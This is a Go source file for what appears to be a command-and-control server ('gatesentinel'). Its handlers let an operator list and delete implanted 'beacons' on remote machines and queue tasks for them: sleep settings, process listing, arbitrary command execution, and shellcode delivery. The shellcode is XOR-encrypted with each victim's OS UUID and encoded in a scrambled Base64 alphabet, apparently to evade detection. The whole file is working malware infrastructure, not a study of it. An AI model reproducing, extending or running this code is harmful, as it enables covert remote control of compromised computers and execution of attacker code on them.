package handler

import (
	"gatesentinel/config"
	"gatesentinel/db"
	"gatesentinel/utils"
	"net/http"
	"strings"

	"database/sql"
	"fmt"
	"log"
	"time"

	"github.com/gin-gonic/gin"
)

// AuthRequired JWT认证中间件（用于API）
func AuthRequired() gin.HandlerFunc {
	return func(c *gin.Context) {
		auth := c.GetHeader("Authorization")
		if auth == "" {
			// 尝试从cookie中获取token
			auth, _ = c.Cookie("token")
			if auth == "" {
				c.JSON(http.StatusUnauthorized, gin.H{"error": "Unauthorized"})
				c.Abort()
				return
			}
		} else {
			// 从Authorization头中提取token
			parts := strings.SplitN(auth, " ", 2)
			if !(len(parts) == 2 && parts[0] == "Bearer") {
				c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid token format"})
				c.Abort()
				return
			}
			auth = parts[1]
		}

		claims, err := utils.ParseToken(auth)
		if err != nil {
			c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid token"})
			c.Abort()
			return
		}

		c.Set("username", claims.Username)
		c.Next()
	}
}

// PageAuthRequired 页面认证中间件（重定向到登录页面）
func PageAuthRequired() gin.HandlerFunc {
	return func(c *gin.Context) {
		// 尝试从cookie中获取token
		auth, err := c.Cookie("token")
		if err != nil || auth == "" {
			// 没有token，重定向到登录页面
			c.Redirect(http.StatusFound, config.GlobalConfig.Routes.LoginPath)
			c.Abort()
			return
		}

		claims, err := utils.ParseToken(auth)
		if err != nil {
			// token无效，重定向到登录页面
			c.Redirect(http.StatusFound, config.GlobalConfig.Routes.LoginPath)
			c.Abort()
			return
		}

		c.Set("username", claims.Username)
		c.Next()
	}
}

// AdminLoginHandler 处理管理员登录
func AdminLoginHandler(c *gin.Context) {
	var login struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}

	if err := c.BindJSON(&login); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid login data"})
		return
	}

	if login.Username != config.GlobalConfig.AdminUser ||
		login.Password != config.GlobalConfig.AdminPass {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid credentials"})
		return
	}

	// 生成JWT token
	token, err := utils.GenerateToken(login.Username)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to generate token"})
		return
	}

	// 设置cookie
	c.SetCookie("token", token, 86400, "/", "", false, true)

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"token":  token,
	})
}

// ListBeaconsHandler 获取所有Beacon列表
func ListBeaconsHandler(c *gin.Context) {
	// 额外检查：如果这是一个未认证的请求，直接返回错误
	username, exists := c.Get("username")
	if !exists || username == "" {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "Authentication required"})
		return
	}

	beacons, err := db.ListBeacons()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to list beacons"})
		return
	}

	// 转换时间格式为毫秒时间戳
	var response []gin.H
	for _, beacon := range beacons {
		// 添加日志记录
		log.Printf("Beacon [%s] times: FirstTime=%v, LastSeen=%v",
			beacon.UUID,
			beacon.FirstTime,
			beacon.LastSeen,
		)

		firstTimeMs := beacon.FirstTime.UnixNano() / int64(time.Millisecond)
		lastSeenMs := beacon.LastSeen.UnixNano() / int64(time.Millisecond)

		log.Printf("Converted timestamps: FirstTime=%d, LastSeen=%d",
			firstTimeMs,
			lastSeenMs,
		)

		response = append(response, gin.H{
			"id":           beacon.ID,
			"ip":           beacon.IP,
			"hostname":     beacon.HostName,
			"username":     beacon.UserName,
			"process_name": beacon.ProcessName,
			"process_path": beacon.ProcessPath,
			"process_id":   beacon.ProcessID,
			"arch":         beacon.Arch,
			"os_uuid":      beacon.OSUUID,
			"uuid":         beacon.UUID,
			"first_time":   firstTimeMs,
			"last_seen":    lastSeenMs,
			"job":          beacon.Job,
			"job_result":   beacon.JobResult,
		})
	}

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data":   response,
	})
}

// GetBeaconHandler 获取单个Beacon的详细信息
func GetBeaconHandler(c *gin.Context) {
	uuid := c.Param("uuid")
	if !utils.ValidateUUID(uuid) {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid UUID"})
		return
	}

	beacon, err := db.GetBeaconByUUID(uuid)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Beacon not found"})
		return
	}

	// 格式化时间为Unix时间戳（毫秒）
	response := gin.H{
		"id":           beacon.ID,
		"ip":           beacon.IP,
		"hostname":     beacon.HostName,
		"username":     beacon.UserName,
		"process_name": beacon.ProcessName,
		"process_path": beacon.ProcessPath,
		"process_id":   beacon.ProcessID,
		"arch":         beacon.Arch,
		"os_uuid":      beacon.OSUUID,
		"uuid":         beacon.UUID,
		"first_time":   beacon.FirstTime.UnixNano() / int64(time.Millisecond),
		"last_seen":    beacon.LastSeen.UnixNano() / int64(time.Millisecond),
		"job":          beacon.Job,
		"job_result":   beacon.JobResult,
	}

	c.JSON(http.StatusOK, response)
}

// GetConfigHandler 获取当前配置
func GetConfigHandler(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"webhook_enable": config.GlobalConfig.WebhookEnable,
		"webhook_url":    config.GlobalConfig.WebhookURL,
		"webhook_key":    config.GlobalConfig.WebhookKey,
		"server": gin.H{
			"host":          config.GlobalConfig.Server.Host,
			"port":          config.GlobalConfig.Server.Port,
			"read_timeout":  config.GlobalConfig.Server.ReadTimeout,
			"write_timeout": config.GlobalConfig.Server.WriteTimeout,
			"max_body_size": config.GlobalConfig.Server.MaxBodySize,
		},
		"routes": gin.H{
			"admin_prefix":    config.GlobalConfig.Routes.AdminPrefix,
			"api_prefix":      config.GlobalConfig.Routes.APIPrefix,
			"beacon_endpoint": config.GlobalConfig.Routes.BeaconEndpoint,
			"register_path":   config.GlobalConfig.Routes.RegisterPath,
			"login_path":      config.GlobalConfig.Routes.LoginPath,
		},
	})
}

// UpdateConfigHandler 更新配置
func UpdateConfigHandler(c *gin.Context) {
	var newConfig struct {
		AdminPass     string `json:"admin_pass"`
		WebhookURL    string `json:"webhook_url"`
		WebhookKey    string `json:"webhook_key"`
		WebhookEnable bool   `json:"webhook_enable"`
		Server        struct {
			Host         string `json:"host"`
			Port         int    `json:"port"`
			ReadTimeout  int    `json:"read_timeout"`
			WriteTimeout int    `json:"write_timeout"`
			MaxBodySize  int    `json:"max_body_size"`
		} `json:"server"`
		Routes struct {
			AdminPrefix    string `json:"admin_prefix"`
			APIPrefix      string `json:"api_prefix"`
			BeaconEndpoint string `json:"beacon_endpoint"`
			RegisterPath   string `json:"register_path"`
			LoginPath      string `json:"login_path"`
		} `json:"routes"`
	}

	if err := c.BindJSON(&newConfig); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid config data"})
		return
	}

	// 更新基本配置
	if newConfig.AdminPass != "" {
		config.GlobalConfig.AdminPass = newConfig.AdminPass
	}
	config.GlobalConfig.WebhookURL = newConfig.WebhookURL
	config.GlobalConfig.WebhookKey = newConfig.WebhookKey
	config.GlobalConfig.WebhookEnable = newConfig.WebhookEnable

	// 更新服务器配置
	if newConfig.Server.Host != "" {
		config.GlobalConfig.Server.Host = newConfig.Server.Host
	}
	if newConfig.Server.Port > 0 {
		config.GlobalConfig.Server.Port = newConfig.Server.Port
	}
	if newConfig.Server.ReadTimeout > 0 {
		config.GlobalConfig.Server.ReadTimeout = newConfig.Server.ReadTimeout
	}
	if newConfig.Server.WriteTimeout > 0 {
		config.GlobalConfig.Server.WriteTimeout = newConfig.Server.WriteTimeout
	}
	if newConfig.Server.MaxBodySize > 0 {
		config.GlobalConfig.Server.MaxBodySize = newConfig.Server.MaxBodySize
	}

	// 更新路由配置
	if newConfig.Routes.AdminPrefix != "" {
		config.GlobalConfig.Routes.AdminPrefix = newConfig.Routes.AdminPrefix
	}
	if newConfig.Routes.APIPrefix != "" {
		config.GlobalConfig.Routes.APIPrefix = newConfig.Routes.APIPrefix
	}
	if newConfig.Routes.BeaconEndpoint != "" {
		config.GlobalConfig.Routes.BeaconEndpoint = newConfig.Routes.BeaconEndpoint
	}
	if newConfig.Routes.RegisterPath != "" {
		config.GlobalConfig.Routes.RegisterPath = newConfig.Routes.RegisterPath
	}
	if newConfig.Routes.LoginPath != "" {
		config.GlobalConfig.Routes.LoginPath = newConfig.Routes.LoginPath
	}

	// 保存配置到文件（热加载）
	if err := config.SaveConfig(); err != nil {
		log.Printf("Failed to save config: %v", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to save configuration"})
		return
	}

	log.Printf("Configuration updated and saved successfully")
	c.JSON(http.StatusOK, gin.H{
		"status":  "success",
		"message": "Configuration updated successfully. Some changes may require server restart to take full effect.",
	})
}

// ReloadConfigHandler 重新加载配置文件
func ReloadConfigHandler(c *gin.Context) {
	if err := config.Init(); err != nil {
		log.Printf("Failed to reload config: %v", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to reload configuration"})
		return
	}

	log.Printf("Configuration reloaded successfully")
	c.JSON(http.StatusOK, gin.H{
		"status":  "success",
		"message": "Configuration reloaded successfully",
	})
}

// DeleteBeaconHandler 删除指定的Beacon
func DeleteBeaconHandler(c *gin.Context) {
	uuid := c.Param("uuid")
	if !utils.ValidateUUID(uuid) {
		c.JSON(http.StatusBadRequest, gin.H{
			"success": false,
			"error":   "无效的UUID",
		})
		return
	}

	err := db.DeleteBeaconByUUID(uuid)
	if err == sql.ErrNoRows {
		c.JSON(http.StatusNotFound, gin.H{
			"success": false,
			"error":   "Beacon不存在",
		})
		return
	}

	if err != nil {
		log.Printf("删除Beacon失败: %v", err)
		c.JSON(http.StatusInternalServerError, gin.H{
			"success": false,
			"error":   "删除失败",
		})
		return
	}

	log.Printf("成功删除Beacon [%s]", uuid)
	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"message": "删除成功",
	})
}

// createTaskHistory 创建任务历史记录的辅助函数
func createTaskHistory(beaconUUID, taskType, command string) {
	history := &db.TaskHistory{
		BeaconUUID: beaconUUID,
		TaskType:   taskType,
		Command:    command,
		Status:     "pending",
		Result:     "",
		CreatedAt:  time.Now(),
		UpdatedAt:  time.Now(),
	}

	if err := db.CreateTaskHistory(history); err != nil {
		log.Printf("Failed to create task history: %v", err)
	}
}

// hexToBytes 将hex字符串转换为字节数组
func hexToBytes(hexStr string) ([]byte, error) {
	// 移除可能的空格和换行符
	hexStr = strings.ReplaceAll(hexStr, " ", "")
	hexStr = strings.ReplaceAll(hexStr, "\n", "")
	hexStr = strings.ReplaceAll(hexStr, "\r", "")
	hexStr = strings.ReplaceAll(hexStr, "\t", "")

	// 确保是偶数长度
	if len(hexStr)%2 != 0 {
		return nil, fmt.Errorf("hex string must have even length")
	}

	// 转换为字节数组
	bytes := make([]byte, len(hexStr)/2)
	for i := 0; i < len(hexStr); i += 2 {
		b, err := parseHexByte(hexStr[i : i+2])
		if err != nil {
			return nil, fmt.Errorf("invalid hex at position %d: %v", i, err)
		}
		bytes[i/2] = b
	}

	return bytes, nil
}

// parseHexByte 解析单个hex字节
func parseHexByte(hexByte string) (byte, error) {
	if len(hexByte) != 2 {
		return 0, fmt.Errorf("hex byte must be 2 characters")
	}

	var result byte
	for i, c := range hexByte {
		var val byte
		if c >= '0' && c <= '9' {
			val = byte(c - '0')
		} else if c >= 'a' && c <= 'f' {
			val = byte(c - 'a' + 10)
		} else if c >= 'A' && c <= 'F' {
			val = byte(c - 'A' + 10)
		} else {
			return 0, fmt.Errorf("invalid hex character: %c", c)
		}

		if i == 0 {
			result = val << 4
		} else {
			result |= val
		}
	}

	return result, nil
}

// bytesToBase64 将字节数组转换为Base64字符串
func bytesToBase64(data []byte) string {
	return base64ToStringManual(data)
}

// base64ToStringManual 手动实现Base64编码（使用自定义编码表）
func base64ToStringManual(data []byte) string {
	// 使用自定义Base64编码表（打乱的）
	const base64Chars = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm0123456789+/"

	if len(data) == 0 {
		return ""
	}

	var result strings.Builder

	// 处理完整的3字节组
	for i := 0; i < len(data); i += 3 {
		var b1, b2, b3 byte
		b1 = data[i]

		if i+1 < len(data) {
			b2 = data[i+1]
		}
		if i+2 < len(data) {
			b3 = data[i+2]
		}

		// 转换为4个6位值
		val1 := b1 >> 2
		val2 := ((b1 & 0x03) << 4) | (b2 >> 4)
		val3 := ((b2 & 0x0F) << 2) | (b3 >> 6)
		val4 := b3 & 0x3F

		result.WriteByte(base64Chars[val1])
		result.WriteByte(base64Chars[val2])

		if i+1 < len(data) {
			result.WriteByte(base64Chars[val3])
		} else {
			result.WriteByte('=')
		}

		if i+2 < len(data) {
			result.WriteByte(base64Chars[val4])
		} else {
			result.WriteByte('=')
		}
	}

	return result.String()
}

// truncateString 截断字符串到指定长度
func truncateString(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}

// xorEncryptDecrypt 使用密钥进行XOR加密/解密
func xorEncryptDecrypt(data []byte, key string) []byte {
	if len(data) == 0 || len(key) == 0 {
		return data
	}

	result := make([]byte, len(data))
	keyBytes := []byte(key)

	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ keyBytes[i%len(keyBytes)]
	}

	return result
}

// UpdateBeaconJobHandler 更新Beacon任务
func UpdateBeaconJobHandler(c *gin.Context) {
	clientId := c.Param("uuid")
	if !utils.ValidateUUID(clientId) {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid UUID"})
		return
	}

	var job struct {
		Type string `json:"type"`
		Data string `json:"data"`
	}

	if err := c.BindJSON(&job); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid job data"})
		return
	}

	// 验证任务类型
	switch job.Type {
	case "NULL":
		// 保持Sleep
		if err := db.UpdateBeaconJob(clientId, ""); err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update job"})
			return
		}
		createTaskHistory(clientId, "NULL", "Clear job")
	case "0x1A":
		// Sleep时间设置
		sleepTime := 0
		if _, err := fmt.Sscanf(job.Data, "Sleep %d", &sleepTime); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid sleep command format"})
			return
		}
		// 构造任务数据：0x1A + sleepTime
		jobData := fmt.Sprintf("%c%d", 0x1A, sleepTime)
		if err := db.UpdateBeaconJob(clientId, jobData); err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update job"})
			return
		}
		createTaskHistory(clientId, "Sleep", fmt.Sprintf("Set sleep time to %d seconds", sleepTime))
		log.Printf("设置Sleep时间为%d秒 [Beacon: %s]", sleepTime, clientId)
	case "0x1B":
		// 获取进程列表
		jobData := fmt.Sprintf("%c", 0x1B)
		if err := db.UpdateBeaconJob(clientId, jobData); err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update job"})
			return
		}
		createTaskHistory(clientId, "Process List", "Get running processes")
	case "0x1C":
		// 检查shellcode数据
		if job.Data == "" {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Empty shellcode data"})
			return
		}

		log.Printf("接收到Shellcode任务，hex数据长度: %d [Beacon: %s]", len(job.Data), clientId)
		log.Printf("Hex数据前64字符: %s", truncateString(job.Data, 64))

		// 将hex格式转换为二进制数据
		shellcodeBytes, err := hexToBytes(job.Data)
		if err != nil {
			log.Printf("Hex转换失败: %v [Beacon: %s]", err, clientId)
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid hex format: " + err.Error()})
			return
		}

		log.Printf("Hex转换成功，二进制数据大小: %d字节 [Beacon: %s]", len(shellcodeBytes), clientId)

		// 获取Beacon的系统UUID用于加密
		beacon, err := db.GetBeaconByUUID(clientId)
		if err != nil {
			log.Printf("获取Beacon信息失败: %v [Beacon: %s]", err, clientId)
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get beacon info"})
			return
		}

		if beacon.OSUUID == "" {
			log.Printf("Beacon系统UUID为空 [Beacon: %s]", clientId)
			c.JSON(http.StatusBadRequest, gin.H{"error": "Beacon system UUID not available"})
			return
		}

		log.Printf("使用系统UUID加密: %s [Beacon: %s]", beacon.OSUUID, clientId)

		// 使用系统UUID进行XOR加密
		encryptedBytes := xorEncryptDecrypt(shellcodeBytes, beacon.OSUUID)
		log.Printf("XOR加密完成，加密后大小: %d字节 [Beacon: %s]", len(encryptedBytes), clientId)

		// 将加密后的数据编码为Base64
		base64Data := bytesToBase64(encryptedBytes)

		log.Printf("Base64编码完成，编码后大小: %d字符 [Beacon: %s]", len(base64Data), clientId)
		log.Printf("Base64数据前64字符: %s", truncateString(base64Data, 64))

		// 构造任务数据：0x1C + Base64编码的加密shellcode
		jobData := fmt.Sprintf("%c%s", 0x1C, base64Data)
		if err := db.UpdateBeaconJob(clientId, jobData); err != nil {
			log.Printf("更新任务失败: %v [Beacon: %s]", err, clientId)
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update job"})
			return
		}
		createTaskHistory(clientId, "Shellcode", fmt.Sprintf("Execute encrypted shellcode (%d bytes)", len(shellcodeBytes)))
		log.Printf("Shellcode任务下发成功，原始: %d字节，加密: %d字节，Base64: %d字符 [Beacon: %s]", len(shellcodeBytes), len(encryptedBytes), len(base64Data), clientId)
	case "0x1D":
		// 命令执行
		if job.Data == "" {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Empty command data"})
			return
		}

		log.Printf("接收到命令执行任务: %s [Beacon: %s]", job.Data, clientId)

		// 构造任务数据：0x1D + 命令字符串
		jobData := fmt.Sprintf("%c%s", 0x1D, job.Data)
		if err := db.UpdateBeaconJob(clientId, jobData); err != nil {
			log.Printf("更新命令执行任务失败: %v [Beacon: %s]", err, clientId)
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update job"})
			return
		}
		createTaskHistory(clientId, "Execute", fmt.Sprintf("Execute command: %s", job.Data))
		log.Printf("命令执行任务下发成功: %s [Beacon: %s]", job.Data, clientId)
	default:
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid job type"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"status": "success"})
}

// GetTaskHistoryHandler 获取任务历史
func GetTaskHistoryHandler(c *gin.Context) {
	beaconUUID := c.Param("uuid")
	if beaconUUID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Beacon UUID is required"})
		return
	}

	// 额外检查：如果这是一个未认证的请求，直接返回错误
	username, exists := c.Get("username")
	if !exists || username == "" {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "Authentication required"})
		return
	}

	histories, err := db.GetTaskHistoryByBeaconUUID(beaconUUID)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get task history"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data":   histories,
	})
}
